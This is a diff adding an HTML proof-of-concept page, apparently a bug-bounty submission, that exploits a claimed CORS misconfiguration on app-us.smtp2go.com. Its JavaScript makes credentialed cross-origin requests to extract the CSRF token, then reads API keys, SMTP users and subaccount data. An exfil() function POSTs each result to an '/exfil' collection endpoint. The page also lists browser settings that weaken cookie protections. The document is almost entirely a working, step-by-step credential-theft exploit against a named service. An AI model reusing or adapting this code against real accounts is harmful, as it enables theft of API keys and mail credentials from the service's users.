@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>WCP-006 — CORS PoC | smtp2go × insights.hotjar.com</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Courier New', monospace;
+      background: #0d0d0d;
+      color: #c9c9c9;
+      padding: 40px;
+      max-width: 1100px;
+    }
+    header { border-bottom: 2px solid #ff3333; padding-bottom: 20px; margin-bottom: 30px; }
+    header h1 { color: #ff3333; font-size: 1.4em; letter-spacing: 1px; }
+    header .meta { color: #666; font-size: 0.8em; margin-top: 8px; }
+    header .origin-pill {
+      display: inline-block;
+      background: #1a1a1a;
+      border: 1px solid #ff3333;
+      color: #ff9900;
+      padding: 3px 10px;
+      border-radius: 3px;
+      font-size: 0.85em;
+      margin-top: 8px;
+    }
+    .vuln-box {
+      background: #1a0000;
+      border: 1px solid #660000;
+      border-left: 4px solid #ff3333;
+      padding: 14px 18px;
+      margin-bottom: 30px;
+      font-size: 0.85em;
+      line-height: 1.6;
+    }
+    .vuln-box .header-line { color: #ff9900; font-weight: bold; margin-bottom: 6px; }
+    code { background: #111; padding: 1px 5px; border: 1px solid #333; color: #44ff88; }
+    .step {
+      background: #111;
+      border: 1px solid #2a2a2a;
+      border-left: 3px solid #444;
+      margin-bottom: 16px;
+      padding: 18px 22px;
+      transition: border-left-color 0.3s;
+    }
+    .step.active  { border-left-color: #ff9900; }
+    .step.done    { border-left-color: #44ff88; }
+    .step.blocked { opacity: 0.45; }
+    .step h2 { font-size: 0.9em; letter-spacing: 1px; margin-bottom: 6px; color: #888; }
+    .step.active h2, .step.done h2 { color: #ff9900; }
+    .step.done h2 { color: #44ff88; }
+    .step p { color: #666; font-size: 0.8em; line-height: 1.5; margin-bottom: 10px; }
+    .step.active p { color: #888; }
+    pre {
+      background: #080808;
+      border: 1px solid #1e1e1e;
+      padding: 12px;
+      font-size: 0.76em;
+      line-height: 1.5;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+      min-height: 36px;
+      margin-top: 10px;
+      color: #aaa;
+    }
+    .btn-row { display: flex; align-items: center; gap: 14px; flex-wrap: wrap; }
+    button {
+      background: #1a1a1a;
+      border: 1px solid #ff9900;
+      color: #ff9900;
+      padding: 8px 20px;
+      cursor: pointer;
+      font-family: 'Courier New', monospace;
+      font-size: 0.82em;
+      letter-spacing: 1px;
+      transition: all 0.15s;
+      white-space: nowrap;
+    }
+    button:hover:not(:disabled) { background: #ff9900; color: #000; }
+    button:disabled { opacity: 0.3; cursor: not-allowed; border-color: #444; color: #444; }
+    .countdown { font-size: 0.78em; color: #555; }
+    .ok   { color: #44ff88; }
+    .warn { color: #ff9900; }
+    .err  { color: #ff3333; }
+    .dim  { color: #555; }
+    footer {
+      border-top: 1px solid #1e1e1e;
+      margin-top: 40px;
+      padding-top: 16px;
+      font-size: 0.72em;
+      color: #444;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>WCP-006 — CORS Misconfiguration PoC</h1>
+  <div class="meta">Target: <code>app-us.smtp2go.com</code> &nbsp;|&nbsp; Bug type: Overly-permissive CORS + credentials</div>
+  <div class="origin-pill">⚠ Simulating JS execution on: http://insights.hotjar.com</div>
+</header>
+
+<div class="vuln-box">
+  <div class="header-line">Vulnerability</div>
+  Every response from <code>app-us.smtp2go.com</code> unconditionally includes:<br><br>
+  &nbsp;&nbsp;<code>Access-Control-Allow-Origin: http://insights.hotjar.com</code><br>
+  &nbsp;&nbsp;<code>Access-Control-Allow-Credentials: true</code><br><br>
+  Steps run sequentially. Each step unlocks the next. CSRF token is extracted automatically
+  from the dashboard HTML — no manual input required.
+</div>
+
+<!-- STEP 1 -->
+<div class="step active" id="step1-box">
+  <h2>STEP 1 — Extract CSRF token cross-origin</h2>
+  <p>Fetches <code>/dashboard/main/</code> HTML cross-origin with session credentials and extracts <code>HTML.csrfkey</code> from the page source.</p>
+  <div class="btn-row">
+    <button id="btn1" onclick="runStep1()">&#9654; Extract CSRF Token</button>
+    <span class="countdown" id="cd1"></span>
+  </div>
+  <pre id="out1"><span class="dim">Click to begin...</span></pre>
+</div>
+
+<!-- STEP 2 -->
+<div class="step blocked" id="step2-box">
+  <h2>STEP 2 — Read dashboard API</h2>
+  <p><code>GET /api/dashboard/main/</code> — account stats, sending limits, configuration. No CSRF required.</p>
+  <div class="btn-row">
+    <button id="btn2" onclick="runStep2()" disabled>&#9654; Read Dashboard</button>
+    <span class="countdown" id="cd2"></span>
+  </div>
+  <pre id="out2"><span class="dim">Waiting for Step 1...</span></pre>
+</div>
+
+<!-- STEP 3 -->
+<div class="step blocked" id="step3-box">
+  <h2>STEP 3 — Exfiltrate API keys</h2>
+  <p><code>POST /api/settings/api_users/</code> — all active API keys readable cross-origin.</p>
+  <div class="btn-row">
+    <button id="btn3" onclick="runStep3()" disabled>&#9654; Read API Keys</button>
+    <span class="countdown" id="cd3"></span>
+  </div>
+  <pre id="out3"><span class="dim">Waiting for Step 2...</span></pre>
+</div>
+
+<!-- STEP 4 -->
+<div class="step blocked" id="step4-box">
+  <h2>STEP 4 — Exfiltrate SMTP credentials</h2>
+  <p><code>GET /api/settings/smtp_users/</code> — all SMTP users and credential metadata.</p>
+  <div class="btn-row">
+    <button id="btn4" onclick="runStep4()" disabled>&#9654; Read SMTP Users</button>
+    <span class="countdown" id="cd4"></span>
+  </div>
+  <pre id="out4"><span class="dim">Waiting for Step 3...</span></pre>
+</div>
+
+<!-- STEP 5 -->
+<div class="step blocked" id="step5-box">
+  <h2>STEP 5 — Exfiltrate subaccounts + master account ID</h2>
+  <p><code>GET /api/settings/subaccounts/</code> — subaccount list, sponsor ID, plan data.</p>
+  <div class="btn-row">
+    <button id="btn5" onclick="runStep5()" disabled>&#9654; Read Subaccounts</button>
+    <span class="countdown" id="cd5"></span>
+  </div>
+  <pre id="out5"><span class="dim">Waiting for Step 4...</span></pre>
+</div>
+
+<footer>
+  WCP-006 | smtp2go CORS misconfiguration PoC &nbsp;|&nbsp;
+  Simulated attacker origin: http://insights.hotjar.com &nbsp;|&nbsp;
+  For authorized security testing only
+</footer>
+
+<script>
+const TARGET = 'https://app-us.smtp2go.com';
+const EXFIL  = '/exfil';
+const DELAY  = 1500; // ms pause before unlocking next step
+
+let csrfToken = null;
+
+// ── utilities ─────────────────────────────────────────────────────────────────
+
+function set(id, html) {
+  document.getElementById(id).innerHTML = html;
+}
+
+function exfil(label, data) {
+  fetch(EXFIL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ label, data, ts: new Date().toISOString() })
+  }).catch(() => {});
+}
+
+function renderResult(id, resp, body, label) {
+  const acao = resp.headers.get('access-control-allow-origin') || '(not present)';
+  const acac = resp.headers.get('access-control-allow-credentials') || '(not present)';
+  const allowed = acao.includes('insights.hotjar.com');
+
+  let parsed = null;
+  try { parsed = JSON.parse(body); } catch {}
+
+  const badge = allowed
+    ? '<span class="ok">✅ CORS ALLOWED — browser permitted cross-origin read</span>'
+    : '<span class="warn">⚠ ACAO mismatch</span>';
+
+  set(id,
+    badge + '\n\n' +
+    `HTTP ${resp.status} ${resp.statusText}\n` +
+    `access-control-allow-origin:      ${acao}\n` +
+    `access-control-allow-credentials: ${acac}\n\n` +
+    `── Response body ─────────────────────────────────────\n` +
+    (parsed ? JSON.stringify(parsed, null, 2).substring(0, 3000) : body.substring(0, 2000))
+  );
+
+  if (allowed) exfil(label, parsed || body.substring(0, 2000));
+  return allowed;
+}
+
+function markDone(n) {
+  const box = document.getElementById('step' + n + '-box');
+  box.className = 'step done';
+}
+
+function unlock(n) {
+  const btn = document.getElementById('btn' + n);
+  const box = document.getElementById('step' + n + '-box');
+  const cd  = document.getElementById('cd' + (n - 1));
+
+  // countdown on previous step
+  let secs = DELAY / 1000;
+  if (cd) {
+    const interval = setInterval(() => {
+      cd.textContent = `Next step unlocks in ${secs}s...`;
+      secs--;
+      if (secs < 0) {
+        clearInterval(interval);
+        cd.textContent = '';
+        btn.disabled = false;
+        box.className = 'step active';
+      }
+    }, 1000);
+    // fire first tick immediately
+    cd.textContent = `Next step unlocks in ${secs}s...`;
+  }
+
+  setTimeout(() => {
+    if (!cd) {
+      btn.disabled = false;
+      box.className = 'step active';
+    }
+  }, DELAY);
+}
+
+function disableBtn(n) {
+  document.getElementById('btn' + n).disabled = true;
+}
+
+// ── Step 1: extract CSRF from dashboard HTML ──────────────────────────────────
+
+async function runStep1() {
+  disableBtn(1);
+  set('out1', '<span class="warn">Fetching /dashboard/main/ HTML cross-origin...</span>');
+
+  try {
+    const resp = await fetch(TARGET + '/dashboard/main/', {
+      method: 'GET',
+      credentials: 'include',
+      mode: 'cors'
+    });
+
+    const acao = resp.headers.get('access-control-allow-origin') || '(not present)';
+    const acac = resp.headers.get('access-control-allow-credentials') || '(not present)';
+    const html = await resp.text();
+
+    const m = html.match(/HTML\.csrfkey\s*=\s*['"]([^'"]+)['"]/);
+    if (!m) throw new Error('CSRF token not found in HTML — check you are logged into smtp2go');
+
+    csrfToken = m[1];
+    exfil('csrf_token', { csrf_key: csrfToken });
+
+    set('out1',
+      '<span class="ok">✅ CSRF token extracted cross-origin</span>\n\n' +
+      `HTTP ${resp.status} ${resp.statusText}\n` +
+      `access-control-allow-origin:      ${acao}\n` +
+      `access-control-allow-credentials: ${acac}\n\n` +
+      `HTML.csrfkey extracted: "${csrfToken.substring(0, 20)}..."\n\n` +
+      '<span class="warn">⚠ Token read from HTML page source — no user interaction required.</span>'
+    );
+
+    markDone(1);
+    unlock(2);
+
+  } catch (e) {
+    set('out1',
+      '<span class="err">❌ ' + e.message + '</span>\n\n' +
+      'Check:\n' +
+      '  1. Logged into smtp2go in another tab in this browser\n' +
+      '  2. Firefox: network.cookie.sameSite.laxByDefault = false\n' +
+      '  3. Firefox: network.cookie.cookieBehavior = 0\n' +
+      '  4. Firefox: HTTPS-Only mode disabled'
+    );
+    document.getElementById('btn1').disabled = false;
+  }
+}
+
+// ── Step 2: dashboard API ─────────────────────────────────────────────────────
+
+async function runStep2() {
+  disableBtn(2);
+  set('out2', '<span class="warn">Fetching dashboard API...</span>');
+
+  try {
+    const r = await fetch(TARGET + '/api/dashboard/main/', {
+      method: 'GET',
+      credentials: 'include',
+      mode: 'cors'
+    });
+    const b = await r.text();
+    renderResult('out2', r, b, 'dashboard');
+    markDone(2);
+    unlock(3);
+  } catch (e) {
+    set('out2', '<span class="err">❌ ' + e.message + '</span>');
+    document.getElementById('btn2').disabled = false;
+  }
+}
+
+// ── Step 3: API keys ──────────────────────────────────────────────────────────
+
+async function runStep3() {
+  disableBtn(3);
+  set('out3', '<span class="warn">Fetching API keys...</span>');
+
+  try {
+    const url = TARGET + '/api/settings/api_users/?action=load-active-users&CSRF_key=' + encodeURIComponent(csrfToken);
+    const r = await fetch(url, {
+      method: 'POST',
+      credentials: 'include',
+      mode: 'cors',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'page_offset=0&search_text='
+    });
+    const b = await r.text();
+    renderResult('out3', r, b, 'api_keys');
+    markDone(3);
+    unlock(4);
+  } catch (e) {
+    set('out3', '<span class="err">❌ ' + e.message + '</span>');
+    document.getElementById('btn3').disabled = false;
+  }
+}
+
+// ── Step 4: SMTP users ────────────────────────────────────────────────────────
+
+async function runStep4() {
+  disableBtn(4);
+  set('out4', '<span class="warn">Fetching SMTP users...</span>');
+
+  try {
+    const url = TARGET + '/api/settings/smtp_users/?action=&CSRF_key=' + encodeURIComponent(csrfToken);
+    const r = await fetch(url, {
+      method: 'GET',
+      credentials: 'include',
+      mode: 'cors'
+    });
+    const b = await r.text();
+    renderResult('out4', r, b, 'smtp_users');
+    markDone(4);
+    unlock(5);
+  } catch (e) {
+    set('out4', '<span class="err">❌ ' + e.message + '</span>');
+    document.getElementById('btn4').disabled = false;
+  }
+}
+
+// ── Step 5: subaccounts ───────────────────────────────────────────────────────
+
+async function runStep5() {
+  disableBtn(5);
+  set('out5', '<span class="warn">Fetching subaccounts...</span>');
+
+  try {
+    const url = TARGET + '/api/settings/subaccounts/?action=&CSRF_key=' + encodeURIComponent(csrfToken);
+    const r = await fetch(url, {
+      method: 'GET',
+      credentials: 'include',
+      mode: 'cors'
+    });
+    const b = await r.text();
+    renderResult('out5', r, b, 'subaccounts');
+    markDone(5);
+    exfil('attack_complete', { ts: new Date().toISOString(), steps_completed: 5 });
+    set('cd5', '<span class="ok">✅ Attack complete — all data exfiltrated to /exfil</span>');
+  } catch (e) {
+    set('out5', '<span class="err">❌ ' + e.message + '</span>');
+    document.getElementById('btn5').disabled = false;
+  }
+}
+</script>
+
+</body>
+</html>
